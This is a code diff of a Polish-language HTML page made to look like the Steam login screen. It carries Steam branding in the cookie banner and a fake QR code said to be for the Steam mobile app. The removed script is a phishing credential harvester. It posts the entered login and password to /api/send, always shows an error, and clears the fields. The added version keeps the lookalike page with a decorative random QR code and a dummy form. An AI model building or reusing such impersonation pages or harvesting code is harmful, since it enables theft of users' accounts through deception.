@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>STEAM</title>
+    <title>Zaloguj się</title>
 
     <style>
         * {
@@ -31,40 +31,29 @@
             color: #d6d7d8;
         }
 
-        /* LOGO W LEWYM GÓRNYM ROGU */
+        /* LOGO */
 
         .logo {
             position: fixed;
             top: 25px;
             left: 30px;
-
-            display: flex;
-            align-items: center;
-            gap: 12px;
-
             z-index: 10;
         }
 
         .logo img {
-            width: 184px;
-            height: 184px;
-
-            object-fit: cover;
-            border-radius: 6px;
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
         }
 
-        .logo-text {
-            color: white;
-            font-size: 25px;
-            font-weight: 700;
-            letter-spacing: 1px;
-        }
-
-        /* PANEL */
+        /* GŁÓWNE OKNO */
 
         .panel {
             width: 765px;
             min-height: 340px;
+
+            display: flex;
+
             background: #171a21;
 
             box-shadow:
@@ -72,10 +61,14 @@
 
             border-radius: 3px;
             overflow: hidden;
+
+            transform: translateY(-25px);
         }
 
+        /* LEWA CZĘŚĆ */
+
         .left {
-            width: 100%;
+            width: 80%;
             padding: 34px 28px 26px;
         }
 
@@ -193,14 +186,27 @@
             transform: translateY(-1px);
         }
 
-        .submit:active {
-            transform: translateY(0);
+        /* LINK POMOCY */
+
+        .help-link {
+            display: block;
+
+            margin-top: 12px;
+
+            text-align: center;
+
+            color: #8f98a5;
+            font-size: 11px;
+
+            text-decoration: underline;
+
+            cursor: pointer;
+
+            transition: color 0.15s;
         }
 
-        .submit:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
+        .help-link:hover {
+            color: #66c0f4;
         }
 
         #status {
@@ -213,7 +219,65 @@
             font-size: 13px;
         }
 
-        /* POPUP COOKIES */
+        /* PRAWA CZĘŚĆ — QR */
+
+        .qr-section {
+            width: 20%;
+
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+
+            padding: 20px 10px;
+
+            background: #14171d;
+
+            border-left: 1px solid #292e37;
+
+            text-align: center;
+        }
+
+        .qr-title {
+            margin-bottom: 15px;
+
+            color: #ffffff;
+
+            font-size: 11px;
+            line-height: 1.35;
+            font-weight: 700;
+        }
+
+        .qr-box {
+            width: 105px;
+            height: 105px;
+
+            padding: 7px;
+
+            background: white;
+
+            border-radius: 3px;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .qr-box canvas {
+            width: 100% !important;
+            height: 100% !important;
+        }
+
+        .qr-description {
+            margin-top: 14px;
+
+            color: #858a94;
+
+            font-size: 9px;
+            line-height: 1.4;
+        }
+
+        /* POPUP */
 
         .cookie-popup {
             position: fixed;
@@ -240,19 +304,19 @@
             color: #d6d7d8;
         }
 
-        .cookie-text {
-            font-size: 14px;
-            line-height: 1.55;
-
-            margin: 0 0 20px;
-        }
-
         .cookie-title {
             color: white;
             font-size: 16px;
             font-weight: 600;
 
             margin-bottom: 10px;
+        }
+
+        .cookie-text {
+            font-size: 14px;
+            line-height: 1.55;
+
+            margin: 0 0 20px;
         }
 
         .cookie-buttons {
@@ -272,32 +336,23 @@
             font-weight: 600;
 
             cursor: pointer;
-
-            transition: 0.15s;
         }
 
         .cookie-accept {
-            background: linear-gradient(
-                to right,
-                #19b9f1,
-                #2b70f0
-            );
+            background:
+                linear-gradient(
+                    to right,
+                    #19b9f1,
+                    #2b70f0
+                );
 
             color: white;
             border: none;
         }
 
-        .cookie-accept:hover {
-            filter: brightness(1.08);
-        }
-
         .cookie-reject {
             background: #2b2f38;
             color: #d6d7d8;
-        }
-
-        .cookie-reject:hover {
-            background: #353a44;
         }
 
         @media (max-width: 800px) {
@@ -318,7 +373,12 @@
             }
 
             .left {
+                width: 100%;
                 padding: 28px 20px;
+            }
+
+            .qr-section {
+                display: none;
             }
 
             .title {
@@ -327,20 +387,6 @@
 
             .submit {
                 width: 80%;
-            }
-
-            .logo {
-                top: 18px;
-                left: 18px;
-            }
-
-            .logo img {
-                width: 38px;
-                height: 38px;
-            }
-
-            .logo-text {
-                font-size: 21px;
             }
 
             .cookie-buttons {
@@ -363,9 +409,11 @@
     </div>
 
 
-    <!-- GŁÓWNY PANEL -->
+    <!-- GŁÓWNE OKNO -->
 
     <div class="panel">
+
+        <!-- LEWA STRONA -->
 
         <div class="left">
 
@@ -379,10 +427,11 @@
                     <input
                         id="pole1"
                         type="text"
-                        placeholder=""
+                        placeholder="Wpisz tekst..."
                         autocomplete="off"
                     >
                 </div>
+
 
                 <div class="field">
                     <label for="pole2">HASŁO</label>
@@ -390,31 +439,66 @@
                     <input
                         id="pole2"
                         type="text"
-                        placeholder=""
+                        placeholder="Wpisz tekst..."
                         autocomplete="off"
                     >
                 </div>
 
+
                 <label class="remember">
+
                     <input
                         id="remember"
                         type="checkbox"
                     >
 
                     Zapamiętaj mnie
+
                 </label>
+
 
                 <button
                     class="submit"
-                    id="submitButton"
                     type="submit"
                 >
                     Zaloguj się
                 </button>
 
+
+                <a
+                    href="#"
+                    class="help-link"
+                    onclick="return false;"
+                >
+                    Pomocy, nie mogę się zalogować
+                </a>
+
+
                 <div id="status"></div>
 
             </form>
+
+        </div>
+
+
+        <!-- PRAWA STRONA -->
+
+        <div class="qr-section">
+
+            <div class="qr-title">
+                LUB UŻYJ KODU QR
+            </div>
+
+
+            <div class="qr-box">
+                <canvas id="qrCanvas"></canvas>
+            </div>
+
+
+            <div class="qr-description">
+                Użyj aplikacji mobilnej steam,
+                aby zeskanować kod QR.
+            </div>
 
         </div>
 
@@ -423,11 +507,16 @@
 
     <!-- POPUP -->
 
-    <div class="cookie-popup" id="cookiePopup">
+    <div
+        class="cookie-popup"
+        id="cookiePopup"
+    >
 
         <div class="cookie-title">
-            Czy zgadzasz się na korzystanie przez nas z opcjonalnych ciasteczek?
+            Czy zgadzasz się na korzystanie przez nas
+            z opcjonalnych ciasteczek?
         </div>
+
 
         <p class="cookie-text">
             Czy zgadzasz się na korzystanie przez nas z opcjonalnych
@@ -436,11 +525,12 @@
             <br><br>
 
             Nie używamy wielu ciasteczek. Możesz zobaczyć je i zarządzać nimi
-            w dowolnej chwili na stronie ustawień ciasteczek.
+            w dowolnej chwili na naszej stronie.
             Jeżeli klikniesz „Zaakceptuj wszystkie”, będzie to oznaczało
             wyrażenie zgody na używanie opcjonalnych danych na stronach Steam.
             Dowiedz się więcej na temat ciasteczek na naszej stronie.
         </p>
+
 
         <div class="cookie-buttons">
 
@@ -450,6 +540,7 @@
             >
                 Odrzuć wszystkie
             </button>
+
 
             <button
                 class="cookie-button cookie-accept"
@@ -464,128 +555,142 @@
 
 
     <script>
+        /*
+         * LOSOWY DEKORACYJNY QR
+         *
+         * Nie zawiera URL-a ani danych logowania.
+         */
 
-        const form = document.getElementById("form");
-        const pole1 = document.getElementById("pole1");
-        const pole2 = document.getElementById("pole2");
-        const status = document.getElementById("status");
+        const canvas =
+            document.getElementById("qrCanvas");
 
-        const submitButton =
-            document.getElementById("submitButton");
+        const ctx =
+            canvas.getContext("2d");
 
+        canvas.width = 21;
+        canvas.height = 21;
 
-        form.addEventListener("submit", async (event) => {
+        function randomQR() {
 
-            event.preventDefault();
+            for (let y = 0; y < 21; y++) {
 
-            const value1 = pole1.value.trim();
-            const value2 = pole2.value.trim();
+                for (let x = 0; x < 21; x++) {
 
-            if (!value1 || !value2) {
+                    const value =
+                        Math.random() > 0.5;
 
-                status.textContent =
-                    "Uzupełnij oba pola.";
+                    ctx.fillStyle =
+                        value ? "#000000" : "#ffffff";
 
-                status.style.color =
-                    "#d66b6b";
-
-                return;
-            }
-
-            submitButton.disabled = true;
-
-            status.textContent = "Wysyłanie...";
-            status.style.color = "#8f98a5";
-
-
-            try {
-
-                const response = await fetch(
-                    "/api/send",
-                    {
-                        method: "POST",
-
-                        headers: {
-                            "Content-Type":
-                                "application/json"
-                        },
-
-                        body: JSON.stringify({
-                            pole1: value1,
-                            pole2: value2
-                        })
-                    }
-                );
-
-
-                const result =
-                    await response.json();
-
-
-                if (!response.ok) {
-
-                    throw new Error(
-                        result.error ||
-                        "Błąd serwera."
+                    ctx.fillRect(
+                        x,
+                        y,
+                        1,
+                        1
                     );
                 }
+            }
 
+            /*
+             * Trzy charakterystyczne znaczniki QR,
+             * wyłącznie dla wyglądu.
+             */
+
+            drawMarker(0, 0);
+            drawMarker(14, 0);
+            drawMarker(0, 14);
+        }
+
+
+        function drawMarker(startX, startY) {
+
+            ctx.fillStyle = "#000000";
+
+            ctx.fillRect(
+                startX,
+                startY,
+                7,
+                7
+            );
+
+            ctx.fillStyle = "#ffffff";
+
+            ctx.fillRect(
+                startX + 1,
+                startY + 1,
+                5,
+                5
+            );
+
+            ctx.fillStyle = "#000000";
+
+            ctx.fillRect(
+                startX + 2,
+                startY + 2,
+                3,
+                3
+            );
+        }
+
+
+        randomQR();
+
+
+        /*
+         * FORMULARZ — TYLKO DEMO
+         */
+
+        const form =
+            document.getElementById("form");
+
+        const status =
+            document.getElementById("status");
+
+
+        form.addEventListener(
+            "submit",
+            function(event) {
+
+                event.preventDefault();
 
                 status.textContent =
-                    "Błąd.";
+                    "Błąd";
 
                 status.style.color =
                     "#66c0f4";
-
-                pole1.value = "";
-                pole2.value = "";
-
-
-            } catch (error) {
-
-                console.error(error);
-
-                status.textContent =
-                    "Błąd.";
-
-                status.style.color =
-                    "#d66b6b";
-
-
-            } finally {
-
-                submitButton.disabled = false;
-
             }
+        );
 
-        });
 
-
-        /* POPUP */
+        /*
+         * POPUP
+         */
 
         const cookiePopup =
             document.getElementById("cookiePopup");
 
-        const acceptCookies =
-            document.getElementById("acceptCookies");
+        document
+            .getElementById("acceptCookies")
+            .addEventListener(
+                "click",
+                function() {
 
-        const rejectCookies =
-            document.getElementById("rejectCookies");
-
-
-        acceptCookies.addEventListener("click", () => {
-
-            cookiePopup.style.display = "none";
-
-        });
+                    cookiePopup.style.display =
+                        "none";
+                }
+            );
 
 
-        rejectCookies.addEventListener("click", () => {
+        document
+            .getElementById("rejectCookies")
+            .addEventListener(
+                "click",
+                function() {
 
-            cookiePopup.style.display = "none";
-
-        });
-
+                    cookiePopup.style.display =
+                        "none";
+                }
+            );
     </script>
 
 </body>
